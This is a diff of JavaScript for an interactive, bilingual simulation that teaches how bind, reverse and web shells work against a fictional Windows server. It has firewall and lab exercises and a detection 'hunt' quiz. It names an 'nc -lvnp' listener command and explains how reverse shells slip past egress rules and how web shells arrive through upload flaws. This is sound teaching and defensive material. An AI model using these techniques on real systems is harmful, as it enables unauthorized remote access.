+    const out = L(r.out);
+    if (out !== '') kT.add({ t: 'o', s: out, cls: typeof r.out === 'object' ? 'wrap' : '' });
+    cwd = r.cwd;
+    f.prompt.innerHTML = esc(cwd) + '&gt;';
+    r.events.forEach((e) => wT.add(e));
+    const norm = line.trim().toLowerCase().replace(/\s+/g, ' ');
+    const done = (mem.done[key] = mem.done[key] || {});
+    steps[i].tasks.forEach((tk, n) => { if (!done[n] && tk.cmd.toLowerCase() === norm) { done[n] = true; const li = $('.tasks li[data-n="' + n + '"]', guide); if (li) { li.classList.add('done'); $('.chk', li).textContent = '✓'; } } });
+    const short = line.trim().slice(0, 12);
+    if (r.exit) {
+      closed = true;
+      wT.add(lg('SYSMON', 'EID 5 · Image=C:\\Windows\\System32\\cmd.exe · process terminated; socket closed by payload.exe'));
+      scene.patch({ conn: null, pipe: false, rows: { C: null }, chips: { k2: { t: 'closed', c: 'bad' }, w1: { t: 'closed', c: 'bad' } } });
+      kT.noForm(); kT.add(kc('')); kT.add(o(t('# Sesión cerrada. Pulsa “Repetir animación” para empezar de nuevo.', '# Session closed. Press “Replay animation” to start over.')));
+      return;
+    }
+    scene.setSpeed(speed * 1.8);
+    scene.play([{ pk: 'k>w', lane: 'shell', label: short }, { pulse: ['C'] }, { pk: 'w>k', lane: 'shell', label: 'output' }]).then(() => scene.setSpeed(speed));
+  }
+  async function reveal(i, tk) {
+    const st = steps[i], ok = alive(tk);
+    scene.set(prevState(i)); setRules(prevState(i)); setTerms(i - 1);
+    const early = st.k.filter(isEarly), late = st.k.filter((l) => !isEarly(l));
+    for (const l of early) { if (!(await kT.type(l, ok, speed))) return; await sleep(120 / speed); }
+    if (st.anim.length) { scene.setSpeed(speed); if (!(await scene.play(st.anim))) return; }
+    if (!ok()) return;
+    const fin = foldScene(steps, i); scene.set(fin); setRules(fin);
+    for (const l of late) { kT.add(l); await sleep(110 / speed); if (!ok()) return; }
+    for (const l of st.w) { if (l.t === 'wc') { if (!(await wT.type(l, ok, speed))) return; } else wT.add(l); await sleep(140 / speed); if (!ok()) return; }
+    mem.visited[i] = true; host.dataset.busy = '0'; stepBar(); setupLive(i); finishAuto(tk, i);
+  }
+  function instant(i, tk) {
+    const fin = foldScene(steps, i); scene.set(fin); setRules(fin); setTerms(i);
+    mem.visited[i] = true; stepBar(); setupLive(i); finishAuto(tk, i);
+  }
+  function go(i, animate) {
+    clearTimeout(autoT);
+    const tk = ++run; mem.idx = i; scene.stop();
+    const st = steps[i];
+    const gated = st.predict && !mem.ans[i] && !mem.skip[i];
+    host.dataset.busy = animate && !gated ? '1' : '0';
+    stepBar();
+    if (gated) {
+      renderGuide(i, true); scene.set(prevState(i)); setRules(prevState(i)); setTerms(i - 1); kT.noForm();
+      return;
+    }
+    renderGuide(i, false);
+    if (st.live === 'hunt') kT.noForm();
+    if (animate) reveal(i, tk); else instant(i, tk);
+  }
+
+  /* ---------- events ---------- */
+  const onGuide = (e) => {
+    const tok = e.target.closest('.tok');
+    if (tok) { const info = tokMap[tok.dataset.b][+tok.dataset.n][1]; const blk = tok.closest('.cmdblock'); $$('.tok', blk).forEach((x) => x.setAttribute('aria-pressed', x === tok)); $('.tokinfo', blk).textContent = tok.textContent + ' → ' + L(info); return; }
+    const opt = e.target.closest('.opt');
+    if (opt && !opt.disabled) { const p = steps[mem.idx].predict, c = +opt.dataset.o; mem.ans[mem.idx] = { c, ok: c === p.ok }; go(mem.idx, true); return; }
+    if (e.target.id === 'skipP') { mem.skip[mem.idx] = true; go(mem.idx, true); return; }
+    const tr = e.target.closest('.try');
+    if (tr) { const f = kT.root._f; if (f) { f.input.value = tr.dataset.cmd; f.input.focus(); } return; }
+    if (e.target.id === 'huntGo') gradeHunt();
+  };
+  function gradeHunt() {
+    let tp = 0, fp = 0, fn = 0;
+    $$('#hunt .hrow', guide).forEach((row) => {
+      const h = HUNT[+row.dataset.n], chk = $('input', row).checked;
+      row.classList.remove('good', 'miss', 'fp');
+      let res;
+      if (h.bad && chk) { tp++; row.classList.add('good'); res = '✔ ' + t('Detectado', 'Caught'); }
+      else if (h.bad) { fn++; row.classList.add('miss'); res = '✘ ' + t('Se te escapó', 'Missed'); }
+      else if (chk) { fp++; row.classList.add('fp'); res = '⚠ ' + t('Falso positivo', 'False positive'); }
+      else res = '✔ ' + t('Normal, bien descartado', 'Normal, correctly ignored');
+      const why = $('.why', row); why.hidden = false; why.innerHTML = '<span class="res">' + res + '.</span> ' + L(h.why);
+    });
+    const total = HUNT.filter((h) => h.bad).length;
+    $('#huntRes', guide).textContent = t('Detectaste ', 'You caught ') + tp + '/' + total + t(' señales; falsos positivos: ', ' signals; false positives: ') + fp + (fn ? t('; sin detectar: ', '; missed: ') + fn : '') + '.';
+  }
+  guide.addEventListener('click', onGuide);
+  $('#stp', host).addEventListener('click', (e) => { const b = e.target.closest('.stp'); if (b) go(+b.dataset.i, false); });
+  $('#prev', host).addEventListener('click', () => { auto = false; go(mem.idx - 1, false); });
+  $('#next', host).addEventListener('click', () => {
+    const st = steps[mem.idx];
+    if (st.predict && !mem.ans[mem.idx] && !mem.skip[mem.idx]) { mem.skip[mem.idx] = true; go(mem.idx, true); } else go(mem.idx + 1, true);
+  });
+  $('#replay', host).addEventListener('click', () => { auto = false; const st = steps[mem.idx]; if (st.predict && !mem.ans[mem.idx]) mem.skip[mem.idx] = true; go(mem.idx, true); });
+  $('#play', host).addEventListener('click', () => {
+    auto = !auto; stepBar();
+    if (auto) { const st = steps[mem.idx]; if (mem.visited[mem.idx] && !st.live && mem.idx < last) go(mem.idx + 1, true); else if (!mem.visited[mem.idx]) go(mem.idx, true); }
+    else clearTimeout(autoT);
+  });
+  $$('.seg button', host).forEach((b) => b.addEventListener('click', () => { speed = +b.dataset.sp; scene.setSpeed(speed); $$('.seg button', host).forEach((x) => x.setAttribute('aria-pressed', x === b)); }));
+  const onKey = (e) => {
+    if (dead || /^(INPUT|SELECT|TEXTAREA)$/.test(document.activeElement && document.activeElement.tagName)) return;
+    if (e.key === 'ArrowRight') $('#next', host).click();
+    if (e.key === 'ArrowLeft') $('#prev', host).click();
+  };
+  document.addEventListener('keydown', onKey);
+
+  go(mem.idx, false);
+  return { destroy() { dead = true; clearTimeout(autoT); scene.stop(); document.removeEventListener('keydown', onKey); } };
+}
+
+/* ============ UI: intro, lab, compare, glossary ============ */
+function goTab(k) { const b = $('.tab[data-k="' + k + '"]'); if (b) b.click(); }
+
+/* ---------- Intro: figure "local vs remote shell" ---------- */
+function mountShellFig(root) {
+  let mode = 'remote', runId = 0;
+  const NODES = {
+    local: [{ id: 'u', x: 40, w: 190, c: 'w', l: t('Tú', 'You'), s: t('teclado + pantalla', 'keyboard + screen') }, { id: 'c', x: 650, w: 210, c: 'w', l: 'cmd.exe', s: t('el intérprete', 'the interpreter') }],
+    remote: [{ id: 'u', x: 20, w: 150, c: 'k', l: t('Tú · Kali', 'You · Kali'), s: t('teclado + pantalla', 'keyboard + screen') }, { id: 'nc', x: 215, w: 130, c: 'k', l: 'nc', s: t('cliente de red', 'network client') },
+      { id: 'sk', x: 500, w: 140, c: 'w', l: t('socket TCP', 'TCP socket'), s: t('en Windows', 'on Windows') }, { id: 'c', x: 735, w: 150, c: 'w', l: 'cmd.exe', s: t('el intérprete', 'the interpreter') }],
+  };
+  const LEGS = {
+    local: [
+      ['u', 'c', 'f', 'whoami↵', t('Escribes <code>whoami</code> y Enter: el teclado alimenta la <b>entrada estándar</b> (stdin) de cmd.exe.', 'You type <code>whoami</code> and Enter: the keyboard feeds cmd.exe’s <b>standard input</b> (stdin).')],
+      ['c', 'c', 'x', '…', t('cmd.exe interpreta la línea y ejecuta el programa.', 'cmd.exe interprets the line and runs the program.')],
+      ['c', 'u', 'b', t('resultado', 'result'), t('El resultado sale por la <b>salida estándar</b> (stdout) y los errores por stderr: aparecen en tu pantalla.', 'The result leaves through <b>standard output</b> (stdout) and errors through stderr: they appear on your screen.')],
+    ],
+    remote: [
+      ['u', 'nc', 'f', 'whoami↵', t('Escribes <code>whoami</code> en Kali: el cliente de red <code>nc</code> lo lee de tu terminal.', 'You type <code>whoami</code> in Kali: the network client <code>nc</code> reads it from your terminal.')],
+      ['nc', 'sk', 'f', 'whoami↵', t('<code>nc</code> lo envía como <b>bytes</b> por una conexión TCP a través de Internet hasta el socket en Windows.', '<code>nc</code> sends it as <b>bytes</b> over a TCP connection across the Internet to the socket on Windows.')],
+      ['sk', 'c', 'f', 'whoami↵', t('El socket está conectado al <b>stdin</b> de cmd.exe: para cmd.exe es como si alguien tecleara en el servidor.', 'The socket is wired to cmd.exe’s <b>stdin</b>: to cmd.exe it is as if somebody typed on the server.')],
+      ['c', 'c', 'x', '…', t('cmd.exe ejecuta el programa. No sabe que no hay un teclado real.', 'cmd.exe runs the program. It does not know there is no real keyboard.')],
+      ['c', 'sk', 'b', t('resultado', 'result'), t('Su <b>stdout/stderr</b> también están conectados al socket: el resultado entra en la conexión.', 'Its <b>stdout/stderr</b> are wired to the socket too: the result goes into the connection.')],
+      ['sk', 'nc', 'b', t('resultado', 'result'), t('Los bytes viajan de vuelta por Internet.', 'The bytes travel back across the Internet.')],
+      ['nc', 'u', 'b', t('resultado', 'result'), t('<code>nc</code> los imprime en tu pantalla. Para ti fue como usar cmd.exe en local.', '<code>nc</code> prints them on your screen. To you it felt like using cmd.exe locally.')],
+    ],
+  };
+  const cx = (n) => n.x + n.w / 2;
+  function draw() {
+    const ns = NODES[mode];
+    let s = '<defs><marker id="sfa" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker></defs>';
+    ns.forEach((n, i) => {
+      s += '<rect class="nbox ' + n.c + '" x="' + n.x + '" y="70" width="' + n.w + '" height="100" rx="10"/><text x="' + cx(n) + '" y="115" text-anchor="middle" font-size="18" font-weight="700">' + esc(n.l) + '</text><text class="lbl" x="' + cx(n) + '" y="138" text-anchor="middle">' + esc(n.s) + '</text>';
+      if (i < ns.length - 1) {
+        const a = ns[i], b = ns[i + 1];
+        s += '<path class="arrow" style="color:var(--muted)" d="M' + (a.x + a.w + 4) + ' 100H' + (b.x - 6) + '" marker-end="url(#sfa)"/><path class="arrow" style="color:var(--muted)" d="M' + (b.x - 4) + ' 146H' + (a.x + a.w + 6) + '" marker-end="url(#sfa)"/>';
+      }
+    });
+    if (mode === 'local') s += '<text class="lbl" x="440" y="90" text-anchor="middle">stdin →</text><text class="lbl" x="440" y="170" text-anchor="middle">← stdout / stderr</text>';
+    else {
+      s += '<text class="lbl" x="422" y="90" text-anchor="middle">TCP · Internet</text><text class="lbl" x="422" y="170" text-anchor="middle">TCP · Internet</text>';
+      s += '<text class="lbl" x="688" y="90" text-anchor="middle">stdin</text><text class="lbl" x="688" y="170" text-anchor="middle">stdout</text>';
+    }
+    s += '<g id="sfdot" opacity="0"><circle class="dot" r="9"/><text id="sfdl" class="lbl" y="-16" text-anchor="middle" style="fill:var(--ink)"></text></g>';
+    $('svg', root).innerHTML = s;
+  }
+  function html() {
+    root.innerHTML = '<div class="ctl"><span class="seg" role="group"><button data-m="local" aria-pressed="' + (mode === 'local') + '">' + esc(t('Shell local', 'Local shell')) + '</button><button data-m="remote" aria-pressed="' + (mode === 'remote') + '">' + esc(t('Shell remota', 'Remote shell')) + '</button></span><button class="btn primary" id="sfgo">▶ ' + esc(t('Teclear un comando', 'Type a command')) + '</button></div>' +
+      '<div class="fig"><svg viewBox="0 0 900 220" role="img" aria-label="' + esc(t('Una shell local conecta teclado y pantalla a cmd.exe; una shell remota sustituye esos cables por un socket TCP.', 'A local shell wires keyboard and screen to cmd.exe; a remote shell replaces those wires with a TCP socket.')) + '"></svg></div><ol class="pts" id="sfcap" style="margin-top:6px"></ol>';
+    draw();
+    $$('[data-m]', root).forEach((b) => b.addEventListener('click', () => { runId++; mode = b.dataset.m; html(); }));
+    $('#sfgo', root).addEventListener('click', go);
+  }
+  async function go() {
+    const id = ++runId, cap = $('#sfcap', root), dot = $('#sfdot', root), lbl = $('#sfdl', root);
+    cap.innerHTML = ''; const ns = Object.fromEntries(NODES[mode].map((n) => [n.id, n]));
+    dot.setAttribute('opacity', 1);
+    for (const [a, b, lane, label, text] of LEGS[mode]) {
+      if (id !== runId) return;
+      const li = document.createElement('li'); li.innerHTML = text; cap.appendChild(li);
+      const y = lane === 'f' ? 100 : lane === 'b' ? 146 : 123;
+      const x0 = lane === 'b' ? cx(ns[a]) - 0 : cx(ns[a]) + (a === b ? 0 : 0), x1 = cx(ns[b]);
+      lbl.textContent = label;
+      const dur = a === b ? 900 : 1100, t0 = performance.now();
+      await new Promise((res) => (function fr(now) {
+        if (id !== runId) return res();
+        const p = Math.min(1, (now - t0) / (REDUCED ? 100 : dur));
+        dot.setAttribute('transform', 'translate(' + (x0 + (x1 - x0) * p) + ',' + y + ')');
+        if (p < 1) requestAnimationFrame(fr); else res();
+      })(t0));
+      await sleep(REDUCED ? 100 : 350);
+    }
+    if (id === runId) dot.setAttribute('opacity', 0);
+  }
+  html();
+}
+
+/* ---------- Intro: scene hover info ---------- */
+const PICK = {
+  k: T('<b>Kali Linux · 203.0.113.50.</b> La máquina del atacante, con IP pública. Aquí corren <code>nc</code> y las herramientas ofensivas. Es el cliente en una bind shell y el servidor en una reverse shell.', '<b>Kali Linux · 203.0.113.50.</b> The attacker’s machine, with a public IP. <code>nc</code> and the offensive tools run here. It is the client in a bind shell and the server in a reverse shell.'),
+  fw: T('<b>Firewall perimetral · 198.51.100.10.</b> Con estado y con NAT. Entrada: sólo 80 y 443 hacia 10.0.0.20; todo lo demás se descarta. Salida: permitida. Recuerda las respuestas a conexiones salientes en su tabla de estado.', '<b>Perimeter firewall · 198.51.100.10.</b> Stateful, with NAT. Inbound: only 80 and 443 to 10.0.0.20; everything else is dropped. Outbound: allowed. It remembers replies to outbound connections in its state table.'),
+  w: T('<b>Windows Server 2022 · ACME-SRV01 · 10.0.0.20.</b> Aloja el portal de ACME en IIS. El proceso <code>w3wp.exe</code> corre con la identidad <code>IIS APPPOOL\\DefaultAppPool</code>: poco privilegiada, pero suficiente para empezar.', '<b>Windows Server 2022 · ACME-SRV01 · 10.0.0.20.</b> Hosts ACME’s portal on IIS. The <code>w3wp.exe</code> process runs as <code>IIS APPPOOL\\DefaultAppPool</code>: low privilege, but enough to start with.'),
+};
+
+function viewIntro(host) {
+  const card = (k, n, tt, d) => '<a class="card" href="#' + k + '" data-go="' + k + '"><span class="n">' + n + '</span><h3>' + tt + '</h3><p class="fine">' + d + '</p></a>';
+  host.innerHTML = '<div class="view">' +
+    '<section class="sec"><h1>Shells Explorer</h1><p class="lead">' + esc(t('Cómo se establecen y funcionan las bind, reverse y web shells, paso a paso: un Kali Linux atacando un Windows Server a través de Internet.', 'How bind, reverse and web shells are established and how they work, step by step: a Kali Linux attacking a Windows Server across the Internet.')) + '</p>' +
+    '<div class="callout warn"><b>' + esc(t('Es una simulación.', 'This is a simulation.')) + '</b> ' + esc(t('Esta página no abre conexiones ni ejecuta nada real. Las IP públicas pertenecen a rangos reservados para documentación (RFC 5737) y la empresa ACME es ficticia. Practica sólo en laboratorios autorizados: usar estas técnicas sin permiso escrito es delito.', 'This page opens no connections and runs nothing real. The public IPs belong to ranges reserved for documentation (RFC 5737) and ACME is fictional. Practice only in authorized labs: using these techniques without written permission is a crime.')) + '</div></section>' +
+    '<section class="sec"><h2>' + esc(t('Cómo usar esta guía', 'How to use this guide')) + '</h2><div class="grid3">' +
+    '<div class="card"><span class="pill k">1 · ' + esc(t('Predice', 'Predict')) + '</span><p style="margin-top:6px">' + esc(t('Antes de cada animación clave se te pide una predicción. Equivocarte es parte del aprendizaje.', 'Before each key animation you are asked for a prediction. Being wrong is part of learning.')) + '</p></div>' +
+    '<div class="card"><span class="pill w">2 · ' + esc(t('Observa', 'Observe')) + '</span><p style="margin-top:6px">' + esc(t('Sigue los paquetes, los comandos y los registros del defensor. Pulsa las partes de cada comando para ver qué hacen.', 'Follow the packets, the commands and the defender’s logs. Click the parts of each command to see what they do.')) + '</p></div>' +
+    '<div class="card"><span class="pill o">3 · ' + esc(t('Practica', 'Practice')) + '</span><p style="margin-top:6px">' + esc(t('Usa la shell simulada, cambia reglas en el Laboratorio y comprueba lo aprendido en Comparar.', 'Use the simulated shell, change rules in the Lab and check what you learned in Compare.')) + '</p></div></div></section>' +
+    '<section class="sec"><h2>' + esc(t('Idea 1 · Una shell es un intérprete con tres cables', 'Idea 1 · A shell is an interpreter with three wires')) + '</h2>' +
+    '<p class="lead">' + t('Un intérprete como <code>cmd.exe</code> lee de su <b>entrada estándar</b> y escribe en su <b>salida estándar</b> y su <b>salida de error</b>. En local esos cables van al teclado y la pantalla. En una shell remota van a un <b>socket de red</b>. Eso es todo el truco.', 'An interpreter such as <code>cmd.exe</code> reads from its <b>standard input</b> and writes to its <b>standard output</b> and <b>standard error</b>. Locally those wires go to the keyboard and screen. In a remote shell they go to a <b>network socket</b>. That is the whole trick.') + '</p><div id="shellfig"></div></section>' +
+    '<section class="sec"><h2>' + esc(t('Idea 2 · ¿Quién escucha y quién conecta?', 'Idea 2 · Who listens and who connects?')) + '</h2>' +
+    '<p class="lead">' + esc(t('Una conexión TCP siempre tiene un lado que espera (LISTEN) y otro que llama (connect). Lo que distingue a los tipos de shell es el reparto de papeles.', 'A TCP connection always has a side that waits (LISTEN) and a side that calls (connect). What tells the shell types apart is how the roles are split.')) + '</p>' +
+    '<div class="grid3" id="roles"></div></section>' +
+    '<section class="sec"><h2>' + esc(t('Idea 3 · El firewall mira quién inicia la conexión', 'Idea 3 · The firewall looks at who starts the connection')) + '</h2>' +
+    '<p class="lead">' + t('Un firewall con estado evalúa las conexiones <i>nuevas</i> contra sus reglas y recuerda las que dejó pasar. Prueba qué hace con cada paquete (entrada 80/443 permitida, el resto denegado; salida permitida):', 'A stateful firewall evaluates <i>new</i> connections against its rules and remembers the ones it let through. Try what it does with each packet (inbound 80/443 allowed, the rest denied; outbound allowed):') + '</p>' +
+    '<div class="card"><div class="mini" id="fwbtns"></div><div class="verdict-box" id="fwres" style="margin-top:12px"></div></div></section>' +
+    '<section class="sec"><h2>' + esc(t('El escenario', 'The scenario')) + '</h2><p class="lead">' + esc(t('Todas las demos usan esta red. Haz clic en cada elemento.', 'All demos use this network. Click each element.')) + '</p>' +
+    '<div class="scene-wrap" id="introSc"></div><div class="callout" id="pickBox" style="min-height:4.5em">' + L(PICK.w) + '</div></section>' +
+    '<section class="sec path"><h2>' + esc(t('Ruta recomendada', 'Suggested path')) + '</h2><div class="grid3">' +
+    card('bind', '1', 'Bind shell', t('El servidor escucha, el atacante conecta. Por qué casi nunca funciona por Internet.', 'The server listens, the attacker connects. Why it almost never works across the Internet.')) +
+    card('reverse', '2', 'Reverse shell', t('El atacante escucha, el servidor conecta hacia fuera. La asimetría del firewall.', 'The attacker listens, the server connects outward. The firewall asymmetry.')) +
+    card('web', '3', 'Web shell', t('El servidor web es el canal. Sin sesión, sin puertos nuevos; se caza en el host.', 'The web server is the channel. No session, no new ports; you hunt it on the host.')) +
+    card('lab', '4', t('Laboratorio', 'Lab'), t('Cambia reglas y observa qué falla y por qué.', 'Change rules and see what fails and why.')) +
+    card('compare', '5', t('Comparar', 'Compare'), t('Tabla comparativa y autoevaluación.', 'Comparison table and self-check.')) +
+    card('glossary', '6', t('Glosario', 'Glossary'), t('Los términos clave en un solo lugar.', 'The key terms in one place.')) +
+    '</div></section></div>';
+  $$('[data-go]', host).forEach((a) => a.addEventListener('click', (e) => { e.preventDefault(); goTab(a.dataset.go); }));
+  mountShellFig($('#shellfig', host));
+  /* roles */
+  const roles = [
+    ['bind', 'Bind shell', t('El servidor <b>escucha</b>; el atacante <b>conecta</b>.', 'The server <b>listens</b>; the attacker <b>connects</b>.'), 'k>w', 'w'],
+    ['reverse', 'Reverse shell', t('El atacante <b>escucha</b>; el servidor <b>conecta</b> hacia fuera.', 'The attacker <b>listens</b>; the server <b>connects</b> outward.'), 'w>k', 'k'],
+    ['web', 'Web shell', t('IIS <b>ya escucha</b> en 443; el atacante hace peticiones HTTP.', 'IIS <b>already listens</b> on 443; the attacker sends HTTP requests.'), 'k>w', 'w'],
+  ];
+  $('#roles', host).innerHTML = roles.map(([k, n, d, dir, lis]) =>
+    '<div class="card"><h3>' + n + '</h3><svg viewBox="0 0 260 90" style="width:100%;height:auto;margin:8px 0"><rect x="4" y="20" width="76" height="50" rx="8" fill="var(--surface2)" stroke="var(--kali)" stroke-width="2.5"/><text x="42" y="50" text-anchor="middle" font-size="13" font-weight="700" fill="var(--ink)">Kali</text>' +
+    '<rect x="180" y="20" width="76" height="50" rx="8" fill="var(--surface2)" stroke="var(--win)" stroke-width="2.5"/><text x="218" y="50" text-anchor="middle" font-size="13" font-weight="700" fill="var(--ink)">Windows</text>' +
+    '<path d="M' + (dir === 'k>w' ? '86 45H174' : '174 45H86') + '" stroke="var(--ink)" stroke-width="2.5" fill="none" marker-end="url(#ra' + k + ')"/><defs><marker id="ra' + k + '" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0L10 5L0 10z" fill="var(--ink)"/></marker></defs>' +
+    '<text x="130" y="38" text-anchor="middle" font-size="11" font-family="monospace" fill="var(--muted)">' + (k === 'web' ? 'HTTPS' : 'SYN') + '</text>' +
+    '<text x="' + (lis === 'k' ? 42 : 218) + '" y="14" text-anchor="middle" font-size="11" font-weight="700" fill="var(--ok)">LISTEN</text></svg><p>' + L(d) + '</p><p style="margin-top:8px"><button class="btn small" data-go2="' + k + '">' + esc(t('Ver el recorrido', 'See the walkthrough')) + ' ▶</button></p></div>').join('');
+  $$('[data-go2]', host).forEach((b) => b.addEventListener('click', () => goTab(b.dataset.go2)));
+  /* firewall demo */
+  const fwCases = [
+    [t('Conexión NUEVA entrante a TCP/4444', 'NEW inbound connection to TCP/4444'), false, t('No coincide con ninguna regla de entrada permitida (sólo 80/443) ni con una entrada de la tabla de estado: cae en <b>deny por defecto</b> y se descarta.', 'It matches no allowed inbound rule (only 80/443) and no state-table entry: it falls into the <b>default deny</b> and is dropped.')],
+    [t('Conexión NUEVA saliente a TCP/4444', 'NEW outbound connection to TCP/4444'), true, t('La regla de salida permite todo. El firewall la deja pasar y <b>crea una entrada en su tabla de estado</b>.', 'The outbound rule allows everything. The firewall lets it through and <b>creates an entry in its state table</b>.')],
+    [t('Respuesta SYN-ACK de esa conexión saliente', 'SYN-ACK reply to that outbound connection'), true, t('Coincide con la entrada de estado creada antes: se permite <b>aunque la entrada esté denegada</b>.', 'It matches the state entry created earlier: it is allowed <b>even though inbound is denied</b>.')],
+    [t('SYN-ACK suelto que nadie pidió', 'A stray SYN-ACK nobody asked for'), false, t('No hay entrada de estado que lo respalde, así que se evalúa como conexión nueva entrante y se descarta.', 'No state entry backs it, so it is evaluated as a new inbound connection and dropped.')],
+  ];
+  $('#fwbtns', host).innerHTML = fwCases.map((c, i) => '<button class="btn" data-fw="' + i + '">' + c[0] + '</button>').join('');
+  $('#fwres', host).innerHTML = '<span class="fine">' + esc(t('Elige un paquete para ver el veredicto.', 'Pick a packet to see the verdict.')) + '</span>';
+  $$('[data-fw]', host).forEach((b) => b.addEventListener('click', () => { const c = fwCases[+b.dataset.fw]; $('#fwres', host).innerHTML = '<span class="pill ' + (c[1] ? 'o' : 'b') + '">' + (c[1] ? 'ALLOW' : 'DROP') + '</span> <p style="margin-top:6px">' + L(c[2]) + '</p>'; }));
+  /* scene */
+  createScene($('#introSc', host), { onPick: (k) => { if (PICK[k]) $('#pickBox', host).innerHTML = L(PICK[k]); } });
+}
+
+/* ---------- Lab ---------- */
+const PRESETS = [
+  [T('Bind con firewall por defecto', 'Bind with default firewall'), { shell: 'bind' }],
+  [T('Bind: perímetro abierto, host cerrado', 'Bind: perimeter open, host closed'), { shell: 'bind', inbound: '4444', hostFw: false }],
+  [T('Bind: ambos abiertos', 'Bind: both open'), { shell: 'bind', inbound: '4444', hostFw: true }],
+  [T('Reverse con salida libre', 'Reverse with open egress'), { shell: 'reverse' }],
+  [T('Reverse: salida sólo 80/443, puerto 4444', 'Reverse: egress only 80/443, port 4444'), { shell: 'reverse', egress: 'web', lport: 4444 }],
+  [T('Reverse: salida sólo 80/443, puerto 443', 'Reverse: egress only 80/443, port 443'), { shell: 'reverse', egress: 'web', lport: 443 }],
+  [T('Reverse sin listener', 'Reverse with no listener'), { shell: 'reverse', listener: false }],
+  [T('Reverse con salida denegada', 'Reverse with egress denied'), { shell: 'reverse', egress: 'none' }],
+  [T('Web con salida denegada', 'Web with egress denied'), { shell: 'web', egress: 'none' }],
+  [T('Web con lista de extensiones', 'Web with extension allow-list'), { shell: 'web', upload: 'allow' }],
+  [T('Web sin ejecución en /uploads', 'Web with no execution in /uploads'), { shell: 'web', exec: 'off' }],
+];
+const CHECK_ICON = { pass: '✓', fail: '✕', skip: '–' };
+
+function mountLab(host) {
+  let cfg = Object.assign({}, LAB_DEFAULT), res = null, guess = null, tally = { ok: 0, n: 0 }, busy = 0;
+  host.innerHTML = '<div class="view"><section class="sec"><h2>' + esc(t('Laboratorio de reglas', 'Rules lab')) + '</h2><p class="lead">' + t('Cambia el firewall y la configuración, predice si la shell se establecerá y ejecuta el intento. El resultado te dice <i>qué comprobación falló</i>, qué ve cada lado y cuáles ajustes no influyeron.', 'Change the firewall and configuration, predict whether the shell will be established, and run the attempt. The result tells you <i>which check failed</i>, what each side sees and which settings made no difference.') + '</p></div>' +
+    '<div class="lab"><div class="card" id="ctl" style="display:flex;flex-direction:column;gap:12px"></div>' +
+    '<div style="display:flex;flex-direction:column;gap:14px;min-width:0"><div class="scene-wrap" id="labsc"></div><p class="fine scroll-hint">↔ ' + esc(t('Desliza el diagrama para verlo completo.', 'Swipe the diagram to see all of it.')) + '</p><div class="grid2"><div class="card"><h4>' + esc(t('Reglas del firewall perimetral', 'Perimeter firewall rules')) + '</h4><div id="rules" style="margin-top:8px"></div></div><div class="card" id="result"></div></div></div></div></div>';
+  const scene = createScene($('#labsc', host));
+  const setRules = (s) => { $('#rules', host).innerHTML = rulesHTML(s); };
+  function preview() {
+    const r = labRun(cfg), sc = labScenario(cfg, r), s = mergeState(BASE_STATE(), sc.pre);
+    scene.set(s); setRules(s);
+  }
+  const sel = (id, label, hint, opts) => '<div class="fld" data-f="' + id + '"><label class="l" for="lab-' + id + '">' + label + '</label><select id="lab-' + id + '">' + opts.map(([v, l]) => '<option value="' + v + '"' + (String(cfg[id]) === String(v) ? ' selected' : '') + '>' + l + '</option>').join('') + '</select><span class="hint">' + hint + '</span></div>';
+  const tog = (id, label, hint) => '<div class="fld" data-f="' + id + '"><label class="sw"><input type="checkbox" id="lab-' + id + '"' + (cfg[id] ? ' checked' : '') + '><span class="l">' + label + '</span></label><span class="hint">' + hint + '</span></div>';
+  function controls() {
+    let h = '<div><h4>' + esc(t('Tipo de shell', 'Shell type')) + '</h4><div class="seg" style="margin-top:6px" role="group">' + ['bind', 'reverse', 'web'].map((k) => '<button data-sh="' + k + '" aria-pressed="' + (cfg.shell === k) + '">' + k + '</button>').join('') + '</div></div>';
+    h += '<div class="fieldset"><span class="lg">' + esc(t('Perímetro', 'Perimeter')) + '</span>' +
+      sel('inbound', t('Entrada extra permitida', 'Extra inbound allowed'), t('Además de TCP 80 y 443.', 'In addition to TCP 80 and 443.'), [['none', t('ninguna', 'none')], ['4444', 'TCP 4444'], ['8080', 'TCP 8080']]) +
+      sel('egress', t('Política de salida', 'Outbound policy'), t('Qué puede iniciar el servidor hacia Internet.', 'What the server may start toward the Internet.'), [['all', t('permitir todo', 'allow all')], ['web', t('sólo TCP 80/443', 'TCP 80/443 only')], ['none', t('denegar todo', 'deny all')]]) + '</div>';
+    if (cfg.shell === 'bind') h += '<div class="fieldset"><span class="lg">' + esc(t('Bind shell', 'Bind shell')) + '</span>' + sel('port', t('Puerto del payload', 'Payload port'), t('Donde hace listen().', 'Where it calls listen().'), [['4444', '4444'], ['8080', '8080']]) + tog('hostFw', t('Regla de entrada en Windows Firewall', 'Inbound rule in Windows Firewall'), t('Permite el puerto del payload en el host.', 'Allows the payload’s port on the host.')) + tog('payload', t('Payload ejecutándose', 'Payload running'), t('Si no, no hay socket en LISTEN.', 'If not, there is no socket in LISTEN.')) + '</div>';
+    if (cfg.shell === 'reverse') h += '<div class="fieldset"><span class="lg">' + esc(t('Reverse shell', 'Reverse shell')) + '</span>' + sel('lport', t('Puerto del listener (LPORT)', 'Listener port (LPORT)'), t('Puerto al que llama el payload.', 'Port the payload calls.'), [['4444', '4444'], ['443', '443']]) + tog('listener', t('Listener activo en Kali', 'Listener running on Kali'), t('nc -lvnp <puerto>', 'nc -lvnp <port>')) + tog('payload', t('Payload ejecutándose', 'Payload running'), t('Requiere ejecución de código previa.', 'Requires prior code execution.')) + '</div>';
+    if (cfg.shell === 'web') h += '<div class="fieldset"><span class="lg">' + esc(t('Web shell', 'Web shell')) + '</span>' + sel('upload', t('Validación de la subida', 'Upload validation'), t('Qué comprueba la aplicación.', 'What the application checks.'), [['none', t('sólo el tipo declarado', 'declared type only')], ['allow', t('lista de extensiones + contenido', 'extension allow-list + content')]]) + sel('exec', t('Scripts en /uploads', 'Scripts in /uploads'), t('Mapeo de manejadores de IIS en esa carpeta.', 'IIS handler mapping in that folder.'), [['on', t('se ejecutan', 'execute')], ['off', t('no se ejecutan', 'do not execute')]]) + '</div>';
